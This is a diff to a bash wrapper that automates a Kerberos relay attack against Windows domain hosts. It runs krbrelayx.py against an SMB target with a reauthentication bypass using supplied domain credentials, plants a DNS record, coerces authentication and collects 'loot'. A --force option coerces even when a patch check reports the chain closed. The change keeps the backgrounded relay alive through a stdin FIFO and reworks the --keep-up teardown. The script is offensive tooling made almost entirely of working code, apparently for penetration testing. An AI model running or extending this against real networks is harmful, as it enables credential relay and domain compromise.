@@ -302,18 +302,15 @@ cmd_auto() {
     fi
   fi
 
-  RELAY_PID=""
+  RELAY_PID=""; RELAY_FIFO=""
   cleanup() {
     local ec=$?
-    if [ "$KEEP_UP" -eq 1 ]; then
-      warn "--keep-up: leaving relay (pid ${RELAY_PID:-?}) and DNS record '$RECORD' in place."
-      warn "tear down when done:  sudo kill ${RELAY_PID:-<pid>}  &&  $0 dns-del -H '$TARGET_HOST' -d '$DOMAIN' ${DC_HOST:+--dc-host '$DC_HOST'} ${DC_IP:+--dc-ip '$DC_IP'} -u '$USER1' -p '<pass>'"
-      exit $ec
-    fi
     warn "teardown ..."
     if [ -n "${RELAY_PID:-}" ] && kill -0 "$RELAY_PID" 2>/dev/null; then
       log "stopping relay (pid $RELAY_PID)"; kill "$RELAY_PID" 2>/dev/null || true
     fi
+    exec 9>&- 2>/dev/null || true                 # drop the fifo write anchor
+    [ -n "${RELAY_FIFO:-}" ] && rm -f "$RELAY_FIFO" 2>/dev/null || true
     ASSUME_YES=1 cmd_dns_del || warn "DNS record NOT removed - delete '$RECORD' by hand!"
     exit $ec
   }
@@ -327,9 +324,17 @@ cmd_auto() {
     run "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
         --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" "${RELAY_IP_ARGS[@]}" -l "$LOOT_DIR"
   else
+    # krbrelayx stays alive by blocking on sys.stdin.read() then sys.exit(0).
+    # Backgrounding detaches stdin to /dev/null -> instant EOF -> it exits right
+    # after "Servers started". Give it a FIFO whose write end the shell holds open
+    # (fd 9, never written), so its read() blocks and the relay keeps running.
+    RELAY_FIFO="$LOOT_DIR/.relay.stdin"
+    rm -f "$RELAY_FIFO" 2>/dev/null || true
+    mkfifo -m 600 "$RELAY_FIFO" 2>/dev/null || die "could not create relay stdin FIFO at $RELAY_FIFO"
+    exec 9<>"$RELAY_FIFO"                          # shell holds the write end open
     "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
         --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" "${RELAY_IP_ARGS[@]}" -l "$LOOT_DIR" \
-        >"$LOOT_DIR/relay.log" 2>&1 &
+        < "$RELAY_FIFO" >"$LOOT_DIR/relay.log" 2>&1 &
     RELAY_PID=$!
     log "relay pid $RELAY_PID (log: $LOOT_DIR/relay.log); waiting for it to bind :445 ..."
     local i up=0
@@ -352,8 +357,9 @@ cmd_auto() {
       sleep 1
     done
   fi
-  if [ "$KEEP_UP" -eq 1 ]; then
-    ok "done; --keep-up set: relay + DNS record left in place (teardown hint printed at exit)."
+  if [ "$KEEP_UP" -eq 1 ] && [ "$DRY_RUN" -eq 0 ]; then
+    ok "relay staying up (pid $RELAY_PID); press Ctrl-C to stop it and tear down the DNS record."
+    wait "$RELAY_PID" 2>/dev/null || true
   else
     ok "done; teardown trap will remove the DNS record and stop the relay."
   fi
@@ -389,7 +395,8 @@ Options (each command uses only the ones it needs):
     -y, --yes                 don't prompt before outbound/destructive steps
         --no-nxc              recon: patchcheck only, skip the nxc module
         --loot-wait N         auto: seconds to wait for loot after coercion (default 90)
-        --keep-up             auto: leave relay + DNS record up instead of tearing down
+        --keep-up             auto: keep the relay running (Ctrl-C to stop) instead of
+                              tearing down right after the loot wait
         --no-check            auto: skip the patchcheck patch-state gate
         --force               auto: coerce even if patchcheck reports the chain CLOSED
     -h, --help
